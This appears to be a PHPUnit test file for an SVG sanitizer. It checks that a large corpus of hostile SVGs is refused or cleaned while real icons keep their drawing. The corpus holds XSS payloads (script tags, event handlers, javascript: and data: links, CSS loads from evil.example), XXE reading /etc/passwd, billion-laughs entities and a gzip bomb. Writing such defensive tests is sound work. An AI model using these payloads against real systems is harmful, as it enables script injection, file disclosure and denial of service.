<?php
/**
 * The SVG sanitizer: a corpus of harmful SVG images is made harmless (or refused), and real icons
 * and vector art come out with the same drawing. No database.
 *
 *  SV-01 - every file of the harmful corpus is refused or comes out without anything that runs or loads
 *  SV-02 - entity tricks, XXE and billion laughs are refused, without expanding anything
 *  SV-03 - real icons and vector art keep every element and attribute that draws
 *  SV-04 - svgz is decompressed; size, node count and depth limits refuse a file
 *  SV-05 - not SVG, not well-formed or nothing left: refused, with a reason
 *  SV-06 - dimensions from width/height (with units) or the viewBox
 *  SV-07 - isSVGFile() / isSVGMarkup() recognise SVG by its root element
 *  SV-08 - <image> keeps an embedded raster image only; <a> keeps http(s) and mailto links
 *  SV-09 - sanitizeFile() writes plain SVG and leaves a refused file unchanged; serving headers
 *  SV-10 - CSS outside the innermost rule blocks (nested rules, an open last block, text before a rule) and
 *          image functions that take a plain string are checked like any declaration
 *  SV-11 - isSVGFile() recognises SVG behind a DOCTYPE or processing instruction with ">" and a prolog longer than 64 kB
 *
 * @copyright Copyright (C) 1998 - 2026 7x and the Exponential Foundation. All rights reserved.
 * @license GNU General Public License v2.0 (or any later version)
 * @package tests
 */

class expSvgSanitizerTest extends PHPUnit\Framework\TestCase
{
    const OPEN = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">';
    const RECT = '<rect width="10" height="10" fill="#08f"/>';

    /** @var string */
    private $dir;

    protected function setUp(): void
    {
        parent::setUp();
        $this->dir = __DIR__ . '/../../../../var/tmp/expsvgsanitizertest_' . getmypid() . '_' . mt_rand();
        @mkdir( $this->dir, 0777, true );
    }

    protected function tearDown(): void
    {
        foreach ( (array)glob( $this->dir . '/*' ) as $file )
            @unlink( $file );
        @rmdir( $this->dir );
        parent::tearDown();
    }

    /**
     * The harmful corpus: name => markup. Each one hides script, an event handler, an external load
     * or a script link somewhere an SVG can carry it.
     *
     * @return array
     */
    public static function harmfulProvider()
    {
        $o = self::OPEN;
        $r = self::RECT;
        $c = array(
            'script element' => "$o<script>alert(1)</script>$r</svg>",
            'script with xlink:href' => "$o<script xlink:href=\"https://evil.example/x.js\"/>$r</svg>",
            'script in CDATA' => "$o<script><![CDATA[alert(document.domain)]]></script>$r</svg>",
            'script in uppercase' => "$o<SCRIPT>alert(1)</SCRIPT>$r</svg>",
            'script with prefix' => '<svg:svg xmlns:svg="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><svg:script>alert(1)</svg:script><svg:rect width="10" height="10"/></svg:svg>',
            'xhtml script' => "$o<h:script xmlns:h=\"http://www.w3.org/1999/xhtml\">alert(1)</h:script>$r</svg>",
            'onload on svg' => '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' . self::RECT . '</svg>',
            'onLoad mixed case' => '<svg xmlns="http://www.w3.org/2000/svg" onLoad="alert(1)">' . self::RECT . '</svg>',
            'onclick on rect' => "$o<rect width=\"10\" height=\"10\" onclick=\"alert(1)\"/></svg>",
            'onmouseover on path' => "$o<path d=\"M0 0h10v10z\" onmouseover=\"alert(1)\"/></svg>",
            'onerror on image' => "$o<image href=\"x\" onerror=\"alert(1)\"/>$r</svg>",
            'onbegin on animate' => "$o$r<animate attributeName=\"x\" dur=\"1s\" onbegin=\"alert(1)\"/></svg>",
            'onfocusin on g' => "$o<g onfocusin=\"alert(1)\">$r</g></svg>",
            'onactivate on text' => "$o<text x=\"1\" y=\"5\" onactivate=\"alert(1)\">a</text></svg>",
            'event attribute in other namespace' => "$o<rect xmlns:e=\"http://www.w3.org/2001/xml-events\" e:onclick=\"alert(1)\" width=\"10\" height=\"10\"/></svg>",
            'foreignObject iframe' => "$o<foreignObject width=\"10\" height=\"10\"><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"/></foreignObject>$r</svg>",
            'foreignObject body onload' => "$o<foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=\"alert(1)\"/></foreignObject>$r</svg>",
            'iframe srcdoc' => "$o<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"/>$r</svg>",
            'a xlink:href javascript' => "$o<a xlink:href=\"javascript:alert(1)\">$r</a></svg>",
            'a href javascript' => "$o<a href=\"javascript:alert(1)\">$r</a></svg>",
            'a href javascript entity encoded' => "$o<a href=\"&#106;avascript:alert(1)\">$r</a></svg>",
            'a href javascript with tab' => "$o<a href=\"java&#9;script:alert(1)\">$r</a></svg>",
            'a href javascript upper case' => "$o<a href=\" JaVaScRiPt:alert(1)\">$r</a></svg>",
            'a href vbscript' => "$o<a href=\"vbscript:msgbox(1)\">$r</a></svg>",
            'a href data text/html' => "$o<a href=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\">$r</a></svg>",
            'a href data base64 script' => "$o<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">$r</a></svg>",
            'use external file' => "$o<use href=\"https://evil.example/sprite.svg#x\"/>$r</svg>",
            'use data svg with script' => "$o<use xlink:href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x\"/>$r</svg>",
            'image external' => "$o<image href=\"https://evil.example/track.png\" width=\"10\" height=\"10\"/>$r</svg>",
            'image data svg' => "$o<image href=\"data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+\"/>$r</svg>",
            'image data png that is html' => "$o<image href=\"data:image/png;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"/>$r</svg>",
            'feImage external' => "$o<filter id=\"f\"><feImage href=\"https://evil.example/x.png\"/></filter><rect width=\"10\" height=\"10\" filter=\"url(#f)\"/></svg>",
            'style url javascript' => "$o<rect width=\"10\" height=\"10\" style=\"fill:url(javascript:alert(1))\"/></svg>",
            'style url external' => "$o<rect width=\"10\" height=\"10\" style=\"fill:url(https://evil.example/x.svg#p)\"/></svg>",
            'style escaped url' => "$o<rect width=\"10\" height=\"10\" style=\"background:\\75 rl(https://evil.example/)\"/></svg>",
            'style expression' => "$o<rect width=\"10\" height=\"10\" style=\"width:expression(alert(1))\"/></svg>",
            'style behavior' => "$o<rect width=\"10\" height=\"10\" style=\"behavior:url(#x);-moz-binding:url(https://evil.example/x.xml#b)\"/></svg>",
            'style element import' => "$o<style>@import url(https://evil.example/x.css); rect{fill:red}</style>$r</svg>",
            'style element escaped import' => "$o<style>@\\69mport 'https://evil.example/x.css'; rect{fill:red}</style>$r</svg>",
            'style element url external' => "$o<style>rect{fill:url(https://evil.example/x.svg#p)}</style>$r</svg>",
            'style element javascript url' => "$o<style>rect{background:url('javascript:alert(1)')}</style>$r</svg>",
            'style element closing trick' => "$o<style><![CDATA[</style><script>alert(1)</script>]]></style>$r</svg>",
            'presentation attribute url external' => "$o<rect width=\"10\" height=\"10\" fill=\"url(https://evil.example/x.svg#p)\" mask=\"url(//evil.example/m)\"/></svg>",
            'filter attribute url external' => "$o<rect width=\"10\" height=\"10\" filter=\"url(https://evil.example/f.svg#f)\"/></svg>",
            'animate href to javascript' => "$o<a><animate attributeName=\"href\" values=\"javascript:alert(1)\"/><text x=\"1\" y=\"5\">x</text></a></svg>",
            'set xlink:href to javascript' => "$o<a xlink:href=\"#\"><set attributeName=\"xlink:href\" to=\"javascript:alert(1)\"/>$r</a></svg>",
            'animate onclick' => "$o$r<animate attributeName=\"onclick\" to=\"alert(1)\"/></svg>",
            'set style url' => "$o$r<set attributeName=\"fill\" to=\"url(https://evil.example/x#y)\"/></svg>",
            'animate values javascript' => "$o<rect width=\"10\" height=\"10\"><animate attributeName=\"fill\" values=\"red;javascript:alert(1)\"/></rect></svg>",
            'comment hiding script' => "$o<!-- <script>alert(1)</script> -->$r</svg>",
            'comment breaking out' => "$o<!--><script>alert(1)</script>-->$r</svg>",
            'processing instruction stylesheet' => '<?xml-stylesheet href="https://evil.example/x.xsl" type="text/xsl"?>' . self::OPEN . self::RECT . '</svg>',
            'nested svg with script' => "$o<svg viewBox=\"0 0 5 5\"><svg onload=\"alert(1)\"><script>alert(2)</script>$r</svg></svg></svg>",
            'nested svg foreignObject' => "$o<g><svg><foreignObject><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></foreignObject></svg></g>$r</svg>",
            'handler element' => "$o<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(1)</handler>$r</svg>",
            'listener element' => "$o<listener event=\"click\" handler=\"#h\"/>$r</svg>",
            'xinclude' => "$o<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\" parse=\"text\"/>$r</svg>",
            'base64 script in attribute' => "$o<rect width=\"10\" height=\"10\" fill=\"data:text/javascript;base64,YWxlcnQoMSk=\"/></svg>",
            'textPath external href' => "$o<text><textPath href=\"https://evil.example/p.svg#p\">x</textPath></text>$r</svg>",
            'mpath external href' => "$o<path id=\"p\" d=\"M0 0h10\"/><circle r=\"1\"><animateMotion dur=\"1s\"><mpath xlink:href=\"https://evil.example/p.svg#p\"/></animateMotion></circle></svg>",
            'a target with script name' => "$o<a href=\"https://example.org/\" target=\"javascript:alert(1)\">$r</a></svg>",
            'font-face src' => "$o<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)} text{font-family:x}</style>$r</svg>",
            'xml:base external' => "<svg xmlns=\"http://www.w3.org/2000/svg\" xml:base=\"https://evil.example/\" viewBox=\"0 0 10 10\"><use href=\"sprite.svg#x\"/>$r</svg>",
            'style element nested rule url' => "$o<style>rect{fill:url(https://evil.example/x.svg#p);g{fill:red}}</style>$r</svg>",
            'style element nested rule behavior' => "$o<style>rect{behavior:url(#b);-moz-binding:url(#x);g{fill:red}}</style>$r</svg>",
            'style element open last block' => "$o<style>g{fill:red} rect{mask:url(https://evil.example/m.svg#m)</style>$r</svg>",
            'style element declaration before rules' => "$o<style>fill:url(https://evil.example/x.svg#p)</style>$r</svg>",
            'style element import with block' => "$o<style>@import url(https://evil.example/x.css) screen{} rect{fill:red}</style>$r</svg>",
            'style element image-set' => "$o<style>rect{cursor:-webkit-image-set(\"https://evil.example/c.png\" 1x),auto}</style>$r</svg>",
            'style attribute image-set' => "$o<rect width=\"10\" height=\"10\" style=\"mask-image:image-set('https://evil.example/m.png' 1x)\"/></svg>",
            'style attribute cross-fade' => "$o<rect width=\"10\" height=\"10\" style=\"mask-image:cross-fade('https://evil.example/m.png', '#a', 50%)\"/></svg>",
            'presentation attribute image-set' => "$o<rect width=\"10\" height=\"10\" mask=\"image-set('https://evil.example/m.png' 1x)\"/></svg>",
            'set mask to image-set' => "$o$r<set attributeName=\"mask\" to=\"image-set('https://evil.example/m.png' 1x)\"/></svg>",
            'style element attr' => "$o<style>rect{mask-image:attr(id type(*))}</style><rect id=\"https://evil.example/m.png\" width=\"10\" height=\"10\"/></svg>",
            'url with a character reference for #' => "$o<rect width=\"10\" height=\"10\" fill=\"url(&amp;#35;p/../../x)\"/></svg>",
        );
        $out = array();
        foreach ( $c as $name => $markup )
            $out[$name] = array( $markup );
        return $out;
    }

    /**
     * SV-01
     */
    #[PHPUnit\Framework\Attributes\DataProvider( 'harmfulProvider' )]
    public function testHarmfulSvgIsMadeHarmless( $markup )
    {
        $clean = expSvgSanitizer::sanitize( $markup );
        if ( $clean === false )
        {
            $this->assertNotSame( '', expSvgSanitizer::lastError() );
            return;
        }
        $this->assertHarmless( $clean );
        // sanitizing the output again changes nothing: there was nothing left to take out
        $this->assertSame( $clean, expSvgSanitizer::sanitize( $clean ) );
    }

    public function testTheHarmfulCorpusIsLargeEnough()
    {
        $this->assertGreaterThanOrEqual( 40, count( self::harmfulProvider() ) );
    }

    /** SV-02 */
    public function testEntitiesXxeAndBillionLaughsAreRefused()
    {
        $xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>' .
               '<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text>' . self::RECT . '</svg>';
        $laughs = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">' .
                  '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]>' .
                  '<svg xmlns="http://www.w3.org/2000/svg"><text>&d;</text>' . self::RECT . '</svg>';
        $parameter = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % p SYSTEM "https://evil.example/x.dtd"> %p;]>' .
                     '<svg xmlns="http://www.w3.org/2000/svg">' . self::RECT . '</svg>';
        $external = '<?xml version="1.0"?><!DOCTYPE svg SYSTEM "https://evil.example/x.dtd" [<!ATTLIST svg onload CDATA "alert(1)">]>' .
                    '<svg xmlns="http://www.w3.org/2000/svg">' . self::RECT . '</svg>';
        $utf16 = mb_convert_encoding( $xxe, 'UTF-16LE', 'UTF-8' );
        foreach ( array( $xxe, $laughs, $parameter, $external, $utf16 ) as $markup )
        {
            $this->assertFalse( expSvgSanitizer::sanitize( $markup ) );
        }
        $this->assertSame( 'not UTF-8', expSvgSanitizer::lastError() );
        expSvgSanitizer::sanitize( $laughs );
        $this->assertSame( 'DOCTYPE with entities', expSvgSanitizer::lastError() );

        // a plain public DOCTYPE, as drawing programs write it, is fine and is not fetched
        $public = '<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://127.0.0.1:9/svg11.dtd">' .
                  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">' . self::RECT . '</svg>';
        $clean = expSvgSanitizer::sanitize( $public );
        $this->assertIsString( $clean );
        $this->assertStringNotContainsString( 'DOCTYPE', $clean );
    }

    /**
     * Real icons and vector art: 12 Bootstrap Icons shipped in share/icons and 3 drawings.
     *
     * @return array
     */
    public static function benignProvider()
    {
        $root = __DIR__ . '/../../../..';
        $files = array();
        foreach ( array( 'archive', 'arrow-clockwise', 'bar-chart-line', 'bell', 'book', 'bookmark', 'box-seam',
                         'briefcase', 'brush', 'building', 'calendar3', 'card-image' ) as $icon )
        {
            $files['bootstrap ' . $icon] = array( $root . '/share/icons/bootstrap-icons/svg/' . $icon . '.svg' );
        }
        foreach ( array( 'wordmark', 'badge', 'chart' ) as $art )
            $files[$art] = array( __DIR__ . '/data/svg/' . $art . '.svg' );
        return $files;
    }

    /**
     * SV-03
     */
    #[PHPUnit\Framework\Attributes\DataProvider( 'benignProvider' )]
    public function testRealImagesKeepTheirDrawing( $path )
    {
        $this->assertFileExists( $path );
        $markup = file_get_contents( $path );
        $clean = expSvgSanitizer::sanitize( $markup );
        $this->assertIsString( $clean, expSvgSanitizer::lastError() );
        $this->assertHarmless( $clean );
        $this->assertSame( self::structure( $markup ), self::structure( $clean ), 'the same elements with the same attributes' );
        $this->assertSame( expSvgSanitizer::dimensions( $markup ), expSvgSanitizer::dimensions( $clean ) );
    }

    public function testTheBenignCorpusIsLargeEnough()
    {
        $this->assertGreaterThanOrEqual( 15, count( self::benignProvider() ) );
    }

    /** SV-04 */
    public function testCompressedAndLimits()
    {
        $markup = self::OPEN . '<script>alert(1)</script>' . self::RECT . '</svg>';
        $clean = expSvgSanitizer::sanitize( gzencode( $markup ) );
        $this->assertIsString( $clean );
        $this->assertStringNotContainsString( 'script', $clean );
        $this->assertStringContainsString( '<rect', $clean );

        $this->assertFalse( expSvgSanitizer::sanitize( gzencode( gzencode( $markup ) ) ) );
        $this->assertFalse( expSvgSanitizer::sanitize( "\x1f\x8b" . 'not gzip at all' ) );

        // a gzip bomb: 20 MB of white space in a few kB
        $bomb = gzencode( self::OPEN . str_repeat( ' ', 20 * 1024 * 1024 ) . self::RECT . '</svg>', 9 );
        $this->assertLessThan( 100000, strlen( $bomb ) );
        $this->assertFalse( expSvgSanitizer::sanitize( $bomb ) );

        $many = self::OPEN . str_repeat( '<g/>', 200 ) . self::RECT . '</svg>';
        $this->assertFalse( expSvgSanitizer::sanitize( $many, array( 'maxNodes' => 100 ) ) );
        $this->assertSame( 'too many nodes', expSvgSanitizer::lastError() );
        $this->assertIsString( expSvgSanitizer::sanitize( $many ) );

        $deep = self::OPEN . str_repeat( '<g>', 50 ) . self::RECT . str_repeat( '</g>', 50 ) . '</svg>';
        $this->assertFalse( expSvgSanitizer::sanitize( $deep, array( 'maxDepth' => 20 ) ) );
        $this->assertSame( 'nested too deeply', expSvgSanitizer::lastError() );

        $this->assertFalse( expSvgSanitizer::sanitize( $markup, array( 'maxBytes' => 20 ) ) );
        $this->assertSame( 'too large', expSvgSanitizer::lastError() );
    }

    /** SV-05 */
    public function testRefusals()
    {
        $this->assertFalse( expSvgSanitizer::sanitize( '' ) );
        $this->assertFalse( expSvgSanitizer::sanitize( '<html><body>x</body></html>' ) );
        $this->assertSame( 'not SVG', expSvgSanitizer::lastError() );
        $this->assertFalse( expSvgSanitizer::sanitize( '<svg xmlns="http://www.w3.org/2000/svg"><rect></svg>' ) );
        $this->assertSame( 'not well-formed', expSvgSanitizer::lastError() );
        $this->assertFalse( expSvgSanitizer::sanitize( '<svg xmlns="http://example.org/not-svg"><rect/></svg>' ) );
        $this->assertFalse( expSvgSanitizer::sanitize( self::OPEN . '<script>alert(1)</script><title>x</title></svg>' ) );
        $this->assertSame( 'nothing safe remains', expSvgSanitizer::lastError() );
        $this->assertFalse( expSvgSanitizer::sanitize( "\x89PNG\r\n\x1a\n" ) );

        // without a namespace the output is put into the SVG namespace, so it renders as an image
        $clean = expSvgSanitizer::sanitize( '<svg viewBox="0 0 10 10"><rect width="10" height="10"/></svg>' );
        $this->assertStringContainsString( 'xmlns="http://www.w3.org/2000/svg"', $clean );
        $this->assertSame( '', expSvgSanitizer::lastError() );
    }

    /** SV-06 */
    public function testDimensions()
    {
        $this->assertSame( array( 24, 16 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="16"/>' ) );
        $this->assertSame( array( 160, 120 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" width="120pt" height="90pt" viewBox="0 0 1 1"/>' ) );
        $this->assertSame( array( 300, 150 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 150"/>' ) );
        $this->assertSame( array( 300, 150 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0,0,300,150"/>' ) );
        $this->assertSame( array( 50, 25 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" width="50" viewBox="0 0 300 150"/>' ) );
        $this->assertSame( array( 96, 96 ), expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg" width="1in" height="25.4mm"/>' ) );
        $this->assertFalse( expSvgSanitizer::dimensions( '<svg xmlns="http://www.w3.org/2000/svg"/>' ) );
        $this->assertFalse( expSvgSanitizer::dimensions( '<html/>' ) );
        $this->assertFalse( expSvgSanitizer::dimensions( $this->dir . '/missing.svg' ) );
        $file = $this->file( 'd.svgz', gzencode( '<svg xmlns="http://www.w3.org/2000/svg" width="7" height="9"/>' ) );
        $this->assertSame( array( 7, 9 ), expSvgSanitizer::dimensions( $file ) );
    }

    /** SV-07 */
    public function testRecognisesSvg()
    {
        $this->assertTrue( expSvgSanitizer::isSVGMarkup( '<svg xmlns="http://www.w3.org/2000/svg"/>' ) );
        $this->assertTrue( expSvgSanitizer::isSVGMarkup( "\xEF\xBB\xBF<?xml version=\"1.0\"?>\n<!-- c -->\n<!DOCTYPE svg PUBLIC \"a\" \"b\">\n<svg>" ) );
        $this->assertTrue( expSvgSanitizer::isSVGMarkup( '<svg:svg xmlns:svg="http://www.w3.org/2000/svg">' ) );
        $this->assertFalse( expSvgSanitizer::isSVGMarkup( '<html><svg></svg></html>' ) );
        $this->assertFalse( expSvgSanitizer::isSVGMarkup( '<svgfoo/>' ) );
        $this->assertTrue( expSvgSanitizer::isSVGFile( $this->file( 'a.svg', self::OPEN . self::RECT . '</svg>' ) ) );
        $this->assertTrue( expSvgSanitizer::isSVGFile( $this->file( 'a.svgz', gzencode( self::OPEN . self::RECT . '</svg>' ) ) ) );
        $this->assertFalse( expSvgSanitizer::isSVGFile( $this->file( 'a.png', "\x89PNG\r\n\x1a\n" ) ) );
        $this->assertFalse( expSvgSanitizer::isSVGFile( $this->dir . '/missing.svg' ) );
    }

    /** SV-08 */
    public function testImageAndLinks()
    {
        $png = self::png();
        $markup = self::OPEN . '<image width="10" height="10" href="data:image/png;base64,' . base64_encode( $png ) . '"/>' .
                  '<a href="https://example.org/" target="_blank">' . self::RECT . '</a>' .
                  '<a xlink:href="mailto:info@example.org"><circle r="2"/></a><a href="#top"><circle r="1"/></a></svg>';
        $clean = expSvgSanitizer::sanitize( $markup );
        $this->assertStringContainsString( 'href="data:image/png;base64,', $clean );
        $this->assertStringContainsString( 'href="https://example.org/"', $clean );
        $this->assertStringContainsString( 'target="_blank"', $clean );
        $this->assertStringContainsString( 'xlink:href="mailto:info@example.org"', $clean );
        $this->assertStringContainsString( 'href="#top"', $clean );
        // an external image goes with its element; the rest stays
        $clean = expSvgSanitizer::sanitize( self::OPEN . '<image href="/var/storage/x.png"/>' . self::RECT . '</svg>' );
        $this->assertStringNotContainsString( '<image', $clean );
        $this->assertStringContainsString( '<rect', $clean );
    }

    /** SV-09 */
    public function testSanitizeFileAndHeaders()
    {
        $source = $this->file( 'in.svgz', gzencode( self::OPEN . '<script>alert(1)</script>' . self::RECT . '</svg>' ) );
        $target = $this->dir . '/out.svg';
        $this->assertTrue( expSvgSanitizer::sanitizeFile( $source, $target ) );
        $out = file_get_contents( $target );
        $this->assertStringStartsWith( '<?xml', $out );
        $this->assertStringNotContainsString( 'script', $out );

        $bad = $this->file( 'bad.svg', '<html/>' );
        $this->assertFalse( expSvgSanitizer::sanitizeFile( $bad ) );
        $this->assertSame( '<html/>', file_get_contents( $bad ) );

        $this->assertSame( array( 'Content-Security-Policy' => "sandbox; default-src 'none'; style-src 'unsafe-inline'",
                                  'X-Content-Type-Options' => 'nosniff' ), expSvgSanitizer::servingHeaders() );
    }

    /** SV-10 */
    public function testStyleSheetKeepsSafeRulesAroundWhatIsRemoved()
    {
        $clean = expSvgSanitizer::sanitize( self::OPEN . '<style>rect{fill:url(https://evil.example/x#p);stroke:#000;' .
                                            'g{fill:url(#grad)}} circle{fill:red</style>' . self::RECT . '</svg>' );
        $this->assertIsString( $clean );
        $this->assertHarmless( $clean );
        $this->assertStringContainsString( 'stroke:#000', $clean );
        $this->assertStringContainsString( 'g{fill:url(#grad)}', $clean );
        $this->assertStringContainsString( 'circle{fill:red', $clean );
        $this->assertStringNotContainsString( 'evil.example', $clean );

        // a selector's "data:" text loads nothing: the rule stays
        $clean = expSvgSanitizer::sanitize( self::OPEN . '<style>.has-data:hover{fill:red} .userdata:first-child{fill:blue}</style>' . self::RECT . '</svg>' );
        $this->assertStringContainsString( '.has-data:hover{fill:red}', $clean );
        $this->assertStringContainsString( '.userdata:first-child{fill:blue}', $clean );
        // but a prelude that loads something goes
        $clean = expSvgSanitizer::sanitize( self::OPEN . '<style>@media url(https://evil.example/x){rect{fill:red}}</style>' . self::RECT . '</svg>' );
        $this->assertHarmless( $clean );
    }

    /** SV-10 */
    public function testLinkMustStartWithItsSchemeAsWritten()
    {
        // decoded, "&#104;ttps://" would read as https:, but a browser takes the value as written
        $clean = expSvgSanitizer::sanitize( self::OPEN . '<a href="&amp;#104;ttps://example.org/">' . self::RECT . '</a></svg>' );
        $this->assertIsString( $clean );
        $this->assertStringNotContainsString( 'href=', $clean );
    }

    /** SV-11 */
    public function testRecognisesSvgBehindAnyProlog()
    {
        $svg = self::OPEN . '<script>alert(1)</script>' . self::RECT . '</svg>';
        $doctype = '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" \'http://127.0.0.1:9/x>y.dtd\'>';
        $pi = '<?xml version="1.0"?><?x-tool a>b ?>';
        foreach ( array( $doctype . $svg, $pi . $svg, '<!--' . str_repeat( 'x', 70000 ) . '-->' . $svg ) as $i => $markup )
        {
            $this->assertTrue( expSvgSanitizer::isSVGMarkup( $markup ), "markup $i" );
            $this->assertTrue( expSvgSanitizer::isSVGFile( $this->file( "p$i.svg", $markup ) ), "file $i" );
            $this->assertTrue( expSvgSanitizer::isSVGFile( $this->file( "p$i.svgz", gzencode( $markup ) ) ), "gzip file $i" );
            $clean = expSvgSanitizer::sanitize( $markup );
            $this->assertIsString( $clean );
            $this->assertHarmless( $clean );
        }
        // a long prolog does not make an HTML page an SVG
        $this->assertFalse( expSvgSanitizer::isSVGFile( $this->file( 'long.html', '<!--' . str_repeat( 'x', 70000 ) . '--><html/>' ) ) );
        // nor does a prolog that cannot be matched take long
        $start = microtime( true );
        $this->assertFalse( expSvgSanitizer::isSVGMarkup( str_repeat( '<!-- a --> <?p b?> ', 3000 ) . '<html/>' ) );
        $this->assertLessThan( 2.0, microtime( true ) - $start );
    }

    /**
     * Asserts that $clean has nothing that runs or loads anything.
     *
     * @param string $clean
     */
    private function assertHarmless( $clean )
    {
        $doc = new DOMDocument();
        $this->assertTrue( $doc->loadXML( $clean, LIBXML_NONET ), 'the output is well-formed' );
        $this->assertNull( $doc->doctype );
        $this->assertSame( 'svg', $doc->documentElement->localName );
        $xpath = new DOMXPath( $doc );
        $this->assertSame( 0, $xpath->query( '//processing-instruction() | //comment()' )->length );
        foreach ( $xpath->query( '//*' ) as $element )
        {
            $this->assertSame( expSvgSanitizer::SVG_NS, $element->namespaceURI );
            $this->assertContains( $element->localName, expSvgSanitizer::ELEMENTS );
            $this->assertNotContains( strtolower( $element->localName ), array( 'script', 'foreignobject', 'iframe', 'handler', 'listener' ) );
            foreach ( $element->attributes as $attribute )
            {
                $name = strtolower( $attribute->localName );
                $value = strtolower( preg_replace( '/[\s\x00-\x1f]+/', '', $attribute->value ) );
                $this->assertStringStartsNotWith( 'on', $name, 'no event attribute' );
                $this->assertDoesNotMatchRegularExpression( '/(?:javascript|vbscript):/', $value );
                if ( $name === 'href' )
                {
                    $ok = $value === '' || $value[0] === '#' || preg_match( '#^(?:https?://|mailto:)#', $value ) && $element->localName === 'a' ||
                          preg_match( '#^data:image/(?:png|jpeg|gif|webp);base64,#', $value ) && $element->localName === 'image';
                    $this->assertTrue( (bool)$ok, "href $value on {$element->localName}" );
                }
                else
                {
                    $this->assertStringNotContainsString( 'data:', $value );
                }
                if ( $name === 'attributename' )
                    $this->assertNotContains( preg_replace( '/^.*:/', '', $value ), array( 'href', 'style' ) );
                $this->assertNoExternalUrl( $value );
                $this->assertNoImageFunction( $value );
            }
            if ( $element->localName === 'style' )
            {
                $css = strtolower( preg_replace( '/\s+/', '', $element->textContent ) );
                $this->assertStringNotContainsString( '@import', $css );
                $this->assertStringNotContainsString( 'expression(', $css );
                $this->assertStringNotContainsString( 'javascript:', $css );
                $this->assertStringNotContainsString( '<', $css );
                $this->assertNoExternalUrl( $css );
                $this->assertNoImageFunction( $css );
                foreach ( array( 'behavior:', '-moz-binding:' ) as $property )
                    $this->assertStringNotContainsString( $property, $css );
            }
        }
    }

    private function assertNoExternalUrl( $value )
    {
        if ( preg_match_all( '/url\(([^)]*)\)?/', $value, $m ) )
        {
            foreach ( $m[1] as $target )
                $this->assertStringStartsWith( '#', trim( $target, '\'"' ), "url($target)" );
        }
    }

    /** No CSS function that loads an image from a plain string */
    private function assertNoImageFunction( $value )
    {
        $this->assertDoesNotMatchRegularExpression( '/(?:image-set|image|cross-fade|element|src|attr)\(/', $value );
    }

    /**
     * The SVG elements of $markup in document order, each with its attributes (name => value,
     * sorted), for comparing what draws.
     *
     * @param string $markup
     * @return array
     */
    private static function structure( $markup )
    {
        $doc = new DOMDocument();
        $doc->loadXML( $markup, LIBXML_NONET | LIBXML_NOCDATA );
        $out = array();
        foreach ( ( new DOMXPath( $doc ) )->query( '//*' ) as $element )
        {
            if ( $element->namespaceURI !== expSvgSanitizer::SVG_NS )
                continue;
            $attributes = array();
            foreach ( $element->attributes as $attribute )
            {
                $value = $attribute->value;
                if ( $attribute->localName === 'style' )
                    $value = str_replace( array( ' ', ';' ), array( '', ';' ), trim( $value, " ;" ) );
                $attributes[$attribute->nodeName] = $value;
            }
            ksort( $attributes );
            $text = in_array( $element->localName, array( 'text', 'tspan', 'title', 'desc' ), true ) ? trim( $element->textContent ) : '';
            if ( $element->localName === 'style' )
                $text = preg_replace( '/\s+/', '', $element->textContent );
            $out[] = array( $element->localName, $attributes, $text );
        }
        return $out;
    }

    private static function png()
    {
        $image = imagecreatetruecolor( 2, 2 );
        ob_start();
        imagepng( $image );
        return ob_get_clean();
    }

    private function file( $name, $content )
    {
        $path = $this->dir . '/' . $name;
        file_put_contents( $path, $content );
        return $path;
    }
}
